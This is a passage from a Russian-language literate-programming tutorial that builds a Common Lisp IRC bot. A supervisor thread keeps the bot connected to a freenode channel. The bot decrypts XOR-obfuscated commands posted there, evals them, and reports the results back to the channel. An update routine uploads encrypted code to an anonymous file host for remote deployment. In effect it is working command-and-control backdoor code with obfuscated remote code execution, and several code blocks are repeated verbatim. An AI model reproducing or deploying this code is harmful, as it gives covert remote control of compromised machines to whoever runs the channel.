        (%shell-command (format nil "~a~@[ ~a~]" binary args))
      (values output error status))))

(defparameter *supervisor*
  (lambda ()
    (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                               (bt:all-threads))))
      (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                              :do (when (equal name nm)  (return th))))
               (kill (th)  (handler-case (bt:destroy-thread th)
                             ;; happens, when thread destroyed already
                             (TYPE-ERROR () nil)))
               (kill-irc (th)
                 (kill th)
                 (setf *watchdog-timer* 0)
                 (setf *connection-established-flag* nil))
               (clear ()
                 (bt:with-recursive-lock-held (*thread-operations-lock*)
                   (setf *shot-threads*
                         (remove-if-not #'(lambda (pair)
                                            (bt:thread-alive-p (car pair)))
                                        *shot-threads*)))))
        ;; if there is no irs-thread then start it
        (when (and (null (fnd "irc-th"))       ;; no irc-th
                   (null *irc-th-stop-flag*))  ;; no irc-th stop flag
          (dbg "::supervisor lambda: start irc-th~%")
          (setf *watchdog-timer* 0)
          (bt:make-thread
           #'irc :name "irc-th"
           :initial-bindings
           `((*standard-output* . ,*standard-output*)
             (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
        ;; if there is irc-thread, but the watchdog-timer exceeds
        ;; or the flag is set - then kill it.
        (awhen (fnd "irc-th")
          (when (&gt; *watchdog-timer*  *watchdog-timer-max*)
            (dbg "::supervisor-lambda: kill irc-th by WDG~%")
            (kill-irc it))
          (when *irc-th-stop-flag*
            (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
            (kill-irc it)))
        ;; kill latecomers shot-threads if there are too many
        ;; TODO: debug it!
        (when (&gt; (length *shot-threads*) *max-shot-thread-cnt*)
          (dbg "::supervisor-lambda: many threads~%")
          (loop :for (shot-th . time) :in *shot-threads* :do
               (dbg "~A . ~A~%" shot-th time)
               (when (&gt; (- (get-universal-time) time)
                        *max-shot-thread-life-time*)
                 (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
                 (kill shot-th)))
          (clear))
        ;; start new shot-thread (every second when connection-established)
        (clear)
        (when *connection-established-flag*
          (let ((bindings `((*standard-output* . ,*standard-output*)
                            (*shot-th-stop-flag* . ,*shot-th-stop-flag*)
                            (*irc-sess* . ,*irc-sess*)
                            (*irc-user* . ,*irc-user*)
                            (*irc-serv* . ,*irc-serv*)
                            (*irc-chan* . ,*irc-chan*)
                            (*irc-lock* . ,*irc-lock*)
                            (*irc-conn* . ,*irc-conn*)
                            (*watchdog-timer* . ,*watchdog-timer*))))
            (bt:with-recursive-lock-held (*thread-operations-lock*)
              (push (cons (bt:make-thread #'shot :name "shot-th"
                                          :initial-bindings bindings)
                          (get-universal-time))
                    *shot-threads*))))))))

(defun supervisor-loop ()
  (setf *watchdog-timer* 0)
  (tagbody
   infinite
     (when *supervisor-stop-flag*
       (go end))
     (dbg "::supervisor-loop WDG=~3,'0D~%" *watchdog-timer*)
     (funcall *supervisor*)
     (sleep *sleep-interval*)
     (incf *watchdog-timer*)
     (go infinite)
   end))

(supervisor-loop)
</pre>
</div>

<p>
Ниже - диаграмма работы супервизора с остальными компонентами
</p>
</div>
</div>

<div id="outline-container-orgcdb22c4" class="outline-2">
<h2 id="orgcdb22c4">Channel Name</h2>
<div class="outline-text-2" id="text-orgcdb22c4">
<p>
Мы будем использовать разные irc-каналы для коммуникации с разными
абонентами - так их проще отлаживать по отдельности.
</p>

<p>
Для этого создадим функцию, которая будет определять имя канала при
tangling-e
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="orgc15dd83">"nvrtlessfndout"
"wntriscoming"
</pre>
</div>
</div>
</div>

<div id="outline-container-orgbc366a1" class="outline-2">
<h2 id="orgbc366a1">File Destionation</h2>
<div class="outline-text-2" id="text-orgbc366a1">
<p>
Таким же образом мы будем танглить путь для сохранения файлов
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org6563ec4">"tan"
"wnt"
</pre>
</div>
</div>
</div>

<div id="outline-container-orgc036ed2" class="outline-2">
<h2 id="orgc036ed2">Irc</h2>
<div class="outline-text-2" id="text-orgc036ed2">
<p>
Работа с IRC состоит из нескольких этапов
</p>
<ul class="org-ul">
<li>Подключение</li>
<li>Запуск цикла чтения сообщений</li>
<li>Установка хука, чтобы перехватить сообщения-команды</li>
<li>Подключение к каналу и отправка первого сообщения</li>
</ul>

<p>
После этого мы можем отпралять сообщения в канал, а когда другие
сообщения будут приходить наш хук будет выполнен.
</p>
</div>

<div id="outline-container-org07fff94" class="outline-3">
<h3 id="org07fff94">Connect</h3>
<div class="outline-text-3" id="text-org07fff94">
<p>
Начнем с подключения к IRC - нашему коммуникационному каналу.
</p>

<p>
Если нет подключения к сети мы получим ошибку
<code>USOCKET:NS-TRY-AGAIN-CONDITION</code>, которая будет проигнорирована, но
записана в лог, как и любые другие ошибки подключения. В этих случаях
функция <code>irc-loop</code> не будет вызвана, произойдет выход их функции потока и
поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит
его и это приведет к следующей попытке подключения.
</p>

<p>
Если подключение произошло успешно - мы вызываем <code>irc-loop</code>.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org7455616">(defparameter *irc-sess* nil) ;; (get-universal-time)
(defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
(defparameter *irc-serv* "irc.freenode.org")
(defparameter *irc-chan* "#wntriscoming")
(defparameter *irc-lock* (bt:make-recursive-lock "irc-lock"))
(defparameter *irc-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*irc-lock*)
     (handler-case
         (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
       (t (err)
         (dbg "::irc connect error: ~A~%" (type-of err))
         nil))))

;; irc-hook
;; irc_cmd_proc
;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  (setf *watchdog-timer* 0)
  t)

(defun irc-helper ()
  (sleep 1)
  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (cl-irc:join *irc-conn* *irc-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (setf *connection-established-flag* t))
  (sendmsg "hi"))

(defun irc-loop ()
  (bt:make-thread
   #'irc-helper :name "irc-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*irc-sess* . ,*irc-sess*)
     (*irc-user* . ,*irc-user*)
     (*irc-serv* . ,*irc-serv*)
     (*irc-chan* . ,*irc-chan*)
     (*irc-lock* . ,*irc-lock*)
     (*irc-conn* . ,*irc-conn*)))
  (handler-case (cl-irc:read-message-loop *irc-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg "::irc-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
    ))

(defun irc ()
  "irc thread func"
  (setf *irc-sess* (get-universal-time))
  (setf *irc-user* (format nil "b~A" *irc-sess*))
  (setf *irc-conn*
        (handler-case
            (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *irc-conn*
    (dbg "::irc conn:~A~%" *irc-conn*)
    (setf *watchdog-timer* 0)
    (irc-loop)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org7f1a58c" class="outline-3">
<h3 id="org7f1a58c">Read loop</h3>
<div class="outline-text-3" id="text-org7f1a58c">
<p>
После успешного подключения мы запускаем цикл чтения сообщений из
коммуникационного канала. В случае успеха этот поток будет зациклен в
нем, поэтому здесь мы должны запустить вспомогательный поток
<code>irc-helper</code>, который установит нужные хуки
</p>

<p>
При временном отключении интернета внутри <code>CL-IRC:READ-MESSAGE-LOOP</code>
может возникнуть ошибка <code>SB-INT:SIMPLE-STREAM-ERROR</code> с сообщением вида
couldn't read from #&lt;SB-SYS:FD-STREAM for "socket 192.168.0.102:50644,
peer: 149.56.134.238:6667" {1008002283}&gt;: Connection reset by peer
</p>

<p>
В этом случае нужно сделать реконнект. Чтобы его осуществить мы просто
игнорируем ошибку, выведя её в лог и возвращая NIL. Это приводит к выходу
из функции потока и супервизор запустит поток снова на следующем шаге.
</p>

<p>
Я временно отключил игнорирование ошибок, чтобы поймать их, если они
произойдут. По идее все возможные ошибки перехватываются в местах их
возникновения, если это не так - я увижу это, т.к. игнор отключен.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgb90a2a8">(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*irc-lock*)
     (handler-case
         (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
       (t (err)
         (dbg "::irc connect error: ~A~%" (type-of err))
         nil))))

;; irc-hook
;; irc_cmd_proc
;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  (setf *watchdog-timer* 0)
  t)

(defun irc-helper ()
  (sleep 1)
  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (cl-irc:join *irc-conn* *irc-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (setf *connection-established-flag* t))
  (sendmsg "hi"))

(defun irc-loop ()
  (bt:make-thread
   #'irc-helper :name "irc-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*irc-sess* . ,*irc-sess*)
     (*irc-user* . ,*irc-user*)
     (*irc-serv* . ,*irc-serv*)
     (*irc-chan* . ,*irc-chan*)
     (*irc-lock* . ,*irc-lock*)
     (*irc-conn* . ,*irc-conn*)))
  (handler-case (cl-irc:read-message-loop *irc-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg "::irc-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
    ))
</pre>
</div>
</div>
</div>

<div id="outline-container-org0915f69" class="outline-3">
<h3 id="org0915f69">Irc helper</h3>
<div class="outline-text-3" id="text-org0915f69">
<p>
После того как мы запустили цикл чтения сообщений следует подождать
немного, чтобы успели дойти приветственные сообщения канала.
</p>

<p>
Мы устанавливаем хук чтобы перехватить приход сообщений и подключаемся к
каналу.
</p>

<p>
После этого мы считаем, что соединение корректно установлено, о чем
сигнализируем установкой флага <b>connection-established-flag</b>
</p>

<p>
После этого можно отправить сообщение о присутствии.
</p>

<p>
Затем поток завершается - свою задачу он выполнил.
</p>

<p>
[TODO:gmm] По-видимому, вероятна ситуация, когда пропадает коннект в
момент передачи сообщения в канал. В этом случае поток застревает в
блокировке, не давая ее взять другим потокам. Я добавил <code>recursive-lock</code>,
но этого недостаточно. Полагаю, необходимо применение таймаутов на
блокировку, но пока не могу придумать модельную ситуацию чтобы проверить
это.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org3a81b50">(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*irc-lock*)
     (handler-case
         (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
       (t (err)
         (dbg "::irc connect error: ~A~%" (type-of err))
         nil))))

;; irc-hook
;; irc_cmd_proc
;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  (setf *watchdog-timer* 0)
  t)

(defun irc-helper ()
  (sleep 1)
  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (cl-irc:join *irc-conn* *irc-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (setf *connection-established-flag* t))
  (sendmsg "hi"))
</pre>
</div>
</div>
</div>

<div id="outline-container-org909fedd" class="outline-3">
<h3 id="org909fedd">Command hook</h3>
<div class="outline-text-3" id="text-org909fedd">
<p>
Определим функцию, которая будет обрабатывать сообщения, получаемые из
irc-канала. Она должна возвращать T чтобы предотвратить дальнейшую
обработку принятого сообщения.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org1c93cd3">;; irc_cmd_proc
;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  (setf *watchdog-timer* 0)
  t)
</pre>
</div>

<p>
У сообщения есть следующие поля:
</p>
<ul class="org-ul">
<li>CL-<a href="SOURCE">SOURCE</a></li>
<li>CL-<a href="USER">USER</a></li>
<li>CL-<a href="HOST">HOST</a></li>
<li>CL-<a href="COMMAND">COMMAND</a></li>
<li>CL-<a href="ARGUMENTS">ARGUMENTS</a></li>
<li>CL-<a href="CONNECTION">CONNECTION</a></li>
<li>CL-<a href="RECEIVED-TIME">RECEIVED-TIME</a></li>
<li>CL-<a href="RAW-MESSAGE-STRING">RAW-MESSAGE-STRING</a></li>
</ul>

<p>
Из них нас интересует собственно команда размещенная в <code>ARGUMENTS</code>. Мы
прогоняем ее через функцию <code>decode</code>, которая регуляркой разбивает команду
на контрольную сумму (CRC32) и base64-кодированный код. Код
расшифровывается с помощью <code>decrypt</code> и текущего <code>seed</code> а затем по нему
вычисляется контрольная сумма. Если переданная контрольная сумма совпала
с вычисленной - эта команда адресована нам, и мы ее выполняем.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgcf60bb0">;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))
</pre>
</div>
</div>
</div>

<div id="outline-container-orgcef684d" class="outline-3">
<h3 id="orgcef684d">Sequence XOR</h3>
<div class="outline-text-3" id="text-orgcef684d">
<div class="org-src-container">
<pre class="src src-lisp" id="org8d0ba8b">(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))
</pre>
</div>
</div>
</div>

<div id="outline-container-org2653565" class="outline-3">
<h3 id="org2653565">Encrypt</h3>
<div class="outline-text-3" id="text-org2653565">
<div class="org-src-container">
<pre class="src src-lisp" id="orgbe383ee">(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org2e78e67" class="outline-3">
<h3 id="org2e78e67">Decrypt</h3>
<div class="outline-text-3" id="text-org2e78e67">
<div class="org-src-container">
<pre class="src src-lisp" id="org7534b97">(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org893bc90" class="outline-3">
<h3 id="org893bc90">Encode</h3>
<div class="outline-text-3" id="text-org893bc90">
<div class="org-src-container">
<pre class="src src-lisp" id="org7cf7994">(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org1c86199" class="outline-3">
<h3 id="org1c86199">Decode</h3>
<div class="outline-text-3" id="text-org1c86199">
<div class="org-src-container">
<pre class="src src-lisp" id="orgeb2e6ce">(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgb58715b" class="outline-2">
<h2 id="orgb58715b">Update On Irc &amp; Features</h2>
<div class="outline-text-2" id="text-orgb58715b">
<p>
Чтобы удаленно расширять функциональность супервизора нам нужен способ
обновить код. В блоке кода <a href="#orgcf60bb0">irc<sub>cmd</sub><sub>proc</sub></a> раздела <a href="#org909fedd">Command hook</a> опредено,
как узел может выполнить команду. Так что теперь мы должны написать
процедуру, которая эту команду сформирует.
</p>

<p>
При этом мы ограничены размером IRC-сообщения, которое может быть не
больше полукилобайта, поэтому сначала лучше закачать зашифрованное
обновление на файлообменник и получить на него ссылку.
</p>

<p>
Эту задачу берет на себя процедура <code>upload-code</code>, ей нужен код,
(представленный как строка) и ключ, чтобы зашифровать код (т.к. мы не
хотим чтобы файлобменник мог его прочитать).
</p>

<p>
Вызвать <code>upload-code</code> это задача оператора. <code>upload-code</code> возвращает
ссылку на закачанный зашифрованный файл.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orga489a3b">(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289
</pre>
</div>

<p>
Теперь, когда есть ссылка, оператор может сформировать команду для
отправки в irc-канал. Для этого он составляет из полученной на предыдущем
этапе ссылки и ключа команду вида:
</p>

<pre class="example">
"(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)"
</pre>

<p>
Но так как команда не посылается в канал в открытом виде - её надо
зашифровать с помощью <code>encode</code>
</p>

<div class="org-src-container">
<pre class="src src-lisp">;; (encode "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)" 3784752939)
;; =&gt; s/2953b20b/61gOM23BnHgQ+JFZnz7WxmlPOMmajHeB4N1efW+gmhVHdICEy2my4tNdK2algQ==
</pre>
</div>

<p>
